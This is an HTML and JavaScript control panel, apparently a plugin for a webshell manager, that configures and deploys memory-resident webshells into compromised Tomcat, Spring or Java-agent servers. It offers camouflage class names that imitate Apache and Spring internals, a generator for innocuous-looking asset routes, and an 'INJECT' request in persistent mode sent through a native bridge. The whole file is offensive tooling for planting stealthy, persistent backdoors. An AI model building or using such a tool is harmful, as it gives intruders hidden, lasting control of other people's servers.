<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>MemoryShell Controller</title>
    <style>
        html, body {
            min-height: 100%;
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            overflow-y: auto; 
            overflow-x: hidden;
        }

        body { 
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            padding: 20px;
        }
        
        .container { 
            width: 100%;
            max-width: 650px; 
            background: #000000; 
            padding: 25px; 
            border-radius: 0px;
            border: 1px solid #ffffff;
            box-sizing: border-box;
            margin: auto; 
        }

        h2 {
            color: #ffffff;
            margin-top: 0; 
            border-bottom: 1px solid #ffffff; 
            padding-bottom: 10px; 
            font-size: 18px; 
            text-transform: uppercase; 
            letter-spacing: 2px; 
        }

        h3 { 
            font-size: 13px; 
            color: #ffffff; 
            text-transform: uppercase; 
            margin-top: 25px; 
        }

        .status-bar { 
            background: #000000; 
            padding: 10px; 
            margin-bottom: 20px; 
            font-size: 12px; 
            border: 1px dashed #ffffff; 
            text-transform: uppercase; 
        }

        .badge { 
            padding: 0px 4px; 
            font-weight: bold; 
        }

        .badge-active { 
            background: #ffffff; 
            color: #000000; 
        }

        .badge-error { 
            border: 1px dashed #ffffff; 
            background: transparent; 
            color: #ffffff; 
        }

        .form-row { 
            display: flex; 
            gap: 15px; 
            margin-bottom: 15px; 
        }

        .form-group { 
            flex: 1; 
            margin-bottom: 15px; 
        }

        label { 
            display: block; 
            margin-bottom: 5px; 
            color: #ffffff; 
            text-transform: uppercase; 
            font-size: 12px; 
            font-weight: bold; 
        }

        input[type="text"], 
        textarea, 
        select { 
            width: 100%; 
            background: #000000; 
            border: 1px solid #ffffff; 
            color: #ffffff; 
            padding: 8px; 
            box-sizing: border-box; 
            font-family: inherit; 
            font-size: 13px; 
        }

        input[type="text"]:focus, 
        textarea:focus, 
        select:focus { 
            outline: none; 
            background: #111111; 
        }

        textarea { 
            height: 100px; 
            resize: vertical; 
        }

        select { 
            appearance: none; 
            -webkit-appearance: none; 
            background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></svg>"); 
            background-repeat: no-repeat; 
            background-position-x: 95%; 
            background-position-y: 50%; 
        }

        button { 
            background-color: transparent; 
            color: #ffffff; 
            font-weight: bold; 
            font-family: inherit; 
            border: 1px solid #ffffff; 
            padding: 10px 25px; 
            cursor: pointer; 
            text-transform: uppercase; 
            letter-spacing: 1px; 
            width: 100%; 
        }

        button:hover:not(:disabled) { 
            background-color: #ffffff; 
            color: #000000; 
        }

        button:disabled { 
            border-color: #444444; 
            color: #444444; 
            cursor: not-allowed; 
        }

        .console { 
            background: #000000; 
            border: 1px solid #ffffff; 
            padding: 15px; 
            height: 180px; 
            overflow-y: auto; 
            white-space: pre-wrap; 
            font-size: 13px; 
            line-height: 1.5; 
        }

        .msf-line { 
            margin-bottom: 4px; 
            color: #ffffff; 
        } 

        .msf-info { 
            color: #3498db; 
            font-weight: bold; 
        }

        .msf-success { 
            color: #2ecc71; 
            font-weight: bold; 
        }

        .msf-warn { 
            color: #f1c40f; 
            font-weight: bold; 
        }

        .msf-error { 
            color: #e74c3c; 
            font-weight: bold; 
        }
    </style>
</head>
<body>
<div class="container">
    <h2>[ MemoryShell Controller ]</h2>
    <div class="status-bar" id="statusBar">[*] Initializing core controller... awaiting bridge...</div>
    
    <div class="form-group">
        <label>> Shell Type / Strategy</label>
        <select id="shellType" onchange="updateDefaultConfig()">
            <option value="tomcat_filter">Tomcat - Filter MemoryShell</option>
            <option value="tomcat_servlet">Tomcat - Servlet MemoryShell</option>
            <option value="spring_interceptor">Spring - Interceptor MemoryShell</option>
            <option value="java_agent">Java Agent - Runtime Injector</option>
        </select>
    </div>
    
    <div class="form-group">
        <label>> WebShell Class (.class Target / Hex Format)</label>
        <textarea id="shellClassHex" oninput="updateJsonConfig()" placeholder="cafebabe0000003200..."></textarea>
    </div>
    
    <div class="form-row">
        <div class="form-group">
            <label>> Target Route / URL Pattern</label>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="urlPattern" value="/Nihahahaha" oninput="updateJsonConfig()" style="flex: 1;">
                <button id="genRouteBtn" onclick="generateRandomRoute()" style="width: auto; padding: 0 15px; margin-top: 0; font-size: 11px;">GEN</button>
            </div>
        </div>
    </div>

    <div class="form-group">
        <label>> Stealth Class Name</label>
        <input type="text" id="className" value="org.apache.catalina.filters.LogFilterOverride" oninput="updateJsonConfig()">
    </div>

    <div class="form-group">
        <label>> Transmitted Config (JSON Target)</label>
        <input type="text" id="targetJson" value="" readonly style="background: #111; color: #aaa; border-color: #444;">
    </div>

    <button id="sendBtn" onclick="executePlugin()" disabled style="margin-top: 10px;">Deploy MemoryShell Module</button>
    <h3>Console Output</h3>
    <div class="console" id="consoleOutput"></div>
</div>
<script>
    const pluginManifest = {
        "supportedLangs": [
            "JSP/NebulaPulsar/DarkMatter",
            "JSPX/NebulaPulsar/DarkMatter",
        ]
    };

    const defaultConfigs = {
        tomcat_filter: "org.apache.catalina.filters.LogFilterOverride",
        tomcat_servlet: "org.apache.catalina.servlets.DefaultStatusServlet",
        spring_interceptor: "org.springframework.web.servlet.handler.WebMvcSecurityInterceptor",
        java_agent: "com.sun.tools.attach.AgentClassLoader"
    };

    let currentShellType = "";

    function updateDefaultConfig() {
        const type = document.getElementById('shellType').value;
        document.getElementById('className').value = defaultConfigs[type] || "";
        appendLog("[*] MODULE CHANGED TO: " + type.toUpperCase());
        updateJsonConfig();
    }

    function generateRandomRoute() {
        const folders = ["assets", "static", "vendor", "lib", "common", "core", "api", "public", "internal", "service"];
        const subfolders = ["js", "css", "utils", "config", "auth", "cache", "metrics", "logs", "validate"];
        const files = ["main", "app", "index", "init", "bootstrap", "worker", "helper", "loader", "bridge", "handler"];
        const extensions = [".ico", ".js", ".css", ".png", ""];

        const f = folders[Math.floor(Math.random() * folders.length)];
        const sf = subfolders[Math.floor(Math.random() * subfolders.length)];
        const file = files[Math.floor(Math.random() * files.length)];
        const ext = extensions[Math.floor(Math.random() * extensions.length)];

        let randomPath = "/";
        if (Math.random() > 0.3) {
            randomPath += f + "/" + sf + "/" + file + ext;
        } else {
            randomPath += f + "/" + file + ext;
        }

        document.getElementById('urlPattern').value = randomPath;
        appendLog("[+] RANDOM ROUTE GENERATED: " + randomPath);
        
        updateJsonConfig();
    }

    function updateJsonConfig() {
        const textarea = document.getElementById('shellClassHex');
        if (!textarea) return;

        const start = textarea.selectionStart, end = textarea.selectionEnd, originalLength = textarea.value.length;
        let cleanedHex = textarea.value.replace(/[\";\r\n\s\\,ox]/gi, "");
        
        if (textarea.value !== cleanedHex) {
            textarea.value = cleanedHex;
            if (start !== null && end !== null) {
                textarea.setSelectionRange(start - (originalLength - cleanedHex.length), end - (originalLength - cleanedHex.length));
            }
        }

        const shellType = document.getElementById('shellType').value;
        const urlPattern = document.getElementById('urlPattern').value;
        const className = document.getElementById('className').value;
        const base64EncodedJavaSource = btoa(unescape(encodeURIComponent(textarea.value)));

        
        const szParamStr = "action=INJECT&mode=persistent&shellType=" + shellType + "&urlPattern=" + encodeURIComponent(urlPattern) + "&className=" + className;

        const configObj = {
            "strategy": "inject", 
            "shellType": shellType,
            "shellClassHex": cleanedHex,
            "urlPattern": urlPattern,
            "className": className,
            "pulsarParam": szParamStr 
        };
        document.getElementById('targetJson').value = JSON.stringify(configObj);
    }

    function appendLog(text) {
        const consoleOutput = document.getElementById('consoleOutput');
        if (!text) return;
        text.split('\n').forEach(line => {
            if (line.trim() === "") return;
            let div = document.createElement('div');
            div.className = 'msf-line';
            if (line.startsWith('[*]')) div.innerHTML = `<span class="msf-info">[*]</span> ${line.substring(3)}`;
            else if (line.startsWith('[+]')) div.innerHTML = `<span class="msf-success">[+]</span> ${line.substring(3)}`;
            else if (line.startsWith('[-]')) div.innerHTML = `<span class="msf-error">[-]</span> ${line.substring(3)}`;
            else if (line.startsWith('[!]')) div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
            else div.innerText = line;
            consoleOutput.appendChild(div);
        });
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    }

    window.addEventListener('DOMContentLoaded', async () => {
        updateJsonConfig();
        const statusBar = document.getElementById('statusBar'), sendBtn = document.getElementById('sendBtn');
        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                currentShellType = await bridge.fnGetShellType();
                if (pluginManifest.supportedLangs.includes(currentShellType)) {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: SOCKET READY`;
                    sendBtn.disabled = false;
                    appendLog("[*] LINK ESTABLISHED WITH NATIVE NODE BRIDGE.");
                    appendLog("[*] PRE-FLIGHT COMPILER ACTIVE. READY TO SHIP BIND DATA.");
                } else {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
                    appendLog(`[-] ABORTED. MODULE REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
                }
            } else {
                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. STANDALONE DRY-RUN MODE SIMULATION.");
                sendBtn.disabled = false;
            }
        } catch (e) {
            appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
        }
    });

    async function executePlugin() {
        const jsonConfig = document.getElementById('targetJson').value;
        const configParsed = JSON.parse(jsonConfig);
        if (!configParsed.shellClassHex) {
            appendLog("[-] ERROR: WebShell Class Hex data cannot be empty.");
            return;
        }
        appendLog(`[*] COMILING RAW DESCRIPTOR [TYPE: ${configParsed.shellType.toUpperCase()}]`);
        appendLog(`[*] TARGET ENDPOINT INTERFACE -> MAPPED TO INMEMORY INJECTOR`);
        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
                const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
                appendLog('[*] PIPING STREAM THROUGH BRIDGE LAYER...');
                const result = await bridge.fnRun(jsonConfig, payloadCode, currentShellType);
                appendLog(result.toUpperCase());
            } else {
                appendLog(`[!] MOCK TRANSMITTING TO INMEMORY TARGET...`);
                setTimeout(() => { appendLog(`[+] MOCK STATUS: SUCCESS (SENT ${configParsed.shellClassHex.length} HEX CHARS)`); }, 600);
            }
        } catch (e) {
            appendLog("[-] TRANSMISSION FAULT: " + e.message.toUpperCase());
        }
    }
</script>
</body>
</html>
